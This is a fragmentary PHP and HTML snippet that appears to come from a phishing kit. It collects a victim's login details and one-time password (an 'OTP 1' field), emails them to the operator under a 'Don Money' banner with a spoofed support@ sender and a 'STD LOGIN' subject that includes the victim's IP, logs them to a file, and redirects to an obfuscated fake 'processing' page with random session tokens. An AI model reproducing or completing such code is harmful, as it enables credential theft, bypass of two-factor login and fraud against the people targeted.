...
<head></head>
                    <body>
                        <table style="">
                            ...
                            <tr>
                                <td style="font-weight: bold">OTP 1:</td>
...
$message .= "|-----------Don Money-------------|\n";
   ...
   $from = "3rd Result <support@".$_SERVER['HTTP_HOST'].">";
	$headers = "From:" . $from. "\r\n";
        $headers .= "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject = "STD LOGIN [$tp1] [$ip] [$date]";
...
fclose($fp);	
		$praga=rand();
$praga=md5($praga);
  header ("Location: processing_2_luPSIxOSIgbWF4PSI.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
